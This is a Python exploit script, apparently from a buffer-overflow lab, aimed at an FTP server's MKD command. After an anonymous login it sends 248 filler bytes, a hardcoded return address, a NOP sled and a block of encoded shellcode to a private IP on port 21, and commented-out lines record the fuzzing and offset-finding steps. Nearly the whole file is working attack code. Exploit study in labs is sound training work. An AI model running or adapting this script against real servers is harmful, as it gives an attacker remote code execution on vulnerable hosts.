#!/usr/bin/env python
import socket
import sys
#fuzz = "A"*1000
#fuzz = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
#fuzz = "A"*248+"B"*4+"C"*748
buf =  ""
buf += "\xbf\x70\x49\xa7\x34\xd9\xe8\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x53\x31\x78\x12\x83\xc0\x04\x03\x08\x47\x45"
buf += "\xc1\x14\xbf\x0b\x2a\xe4\x40\x6c\xa2\x01\x71\xac\xd0"
buf += "\x42\x22\x1c\x92\x06\xcf\xd7\xf6\xb2\x44\x95\xde\xb5"
buf += "\xed\x10\x39\xf8\xee\x09\x79\x9b\x6c\x50\xae\x7b\x4c"
buf += "\x9b\xa3\x7a\x89\xc6\x4e\x2e\x42\x8c\xfd\xde\xe7\xd8"
buf += "\x3d\x55\xbb\xcd\x45\x8a\x0c\xef\x64\x1d\x06\xb6\xa6"
buf += "\x9c\xcb\xc2\xee\x86\x08\xee\xb9\x3d\xfa\x84\x3b\x97"
buf += "\x32\x64\x97\xd6\xfa\x97\xe9\x1f\x3c\x48\x9c\x69\x3e"
buf += "\xf5\xa7\xae\x3c\x21\x2d\x34\xe6\xa2\x95\x90\x16\x66"
buf += "\x43\x53\x14\xc3\x07\x3b\x39\xd2\xc4\x30\x45\x5f\xeb"
buf += "\x96\xcf\x1b\xc8\x32\x8b\xf8\x71\x63\x71\xae\x8e\x73"
buf += "\xda\x0f\x2b\xf8\xf7\x44\x46\xa3\x9f\xa9\x6b\x5b\x60"
buf += "\xa6\xfc\x28\x52\x69\x57\xa6\xde\xe2\x71\x31\x20\xd9"
buf += "\xc6\xad\xdf\xe2\x36\xe4\x1b\xb6\x66\x9e\x8a\xb7\xec"
buf += "\x5e\x32\x62\x98\x56\x95\xdd\xbf\x9b\x65\x8e\x7f\x33"
buf += "\x0e\xc4\x8f\x6c\x2e\xe7\x45\x05\xc7\x1a\x66\x38\x44"
buf += "\x92\x80\x50\x64\xf2\x1b\xcc\x46\x21\x94\x6b\xb8\x03"
buf += "\x8c\x1b\xf1\x45\x0b\x24\x02\x40\x3b\xb2\x89\x87\xff"
buf += "\xa3\x8d\x8d\x57\xb4\x1a\x5b\x36\xf7\xbb\x5c\x13\x6f"
buf += "\x5f\xce\xf8\x6f\x16\xf3\x56\x38\x7f\xc5\xae\xac\x6d"
buf += "\x7c\x19\xd2\x6f\x18\x62\x56\xb4\xd9\x6d\x57\x39\x65"
buf += "\x4a\x47\x87\x66\xd6\x33\x57\x31\x80\xed\x11\xeb\x62"
buf += "\x47\xc8\x40\x2d\x0f\x8d\xaa\xee\x49\x92\xe6\x98\xb5"
buf += "\x23\x5f\xdd\xca\x8c\x37\xe9\xb3\xf0\xa7\x16\x6e\xb1"
buf += "\xd8\x5c\x32\x90\x70\x39\xa7\xa0\x1c\xba\x12\xe6\x18"
buf += "\x39\x96\x97\xde\x21\xd3\x92\x9b\xe5\x08\xef\xb4\x83"
buf += "\x2e\x5c\xb4\x81"

shellcode = '\x90'*20+buf
fuzz = "A"*248+"\x40\x45\x3A\x77"+shellcode+"C"*(748-len(shellcode))
s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.95.192',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD'+fuzz+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close()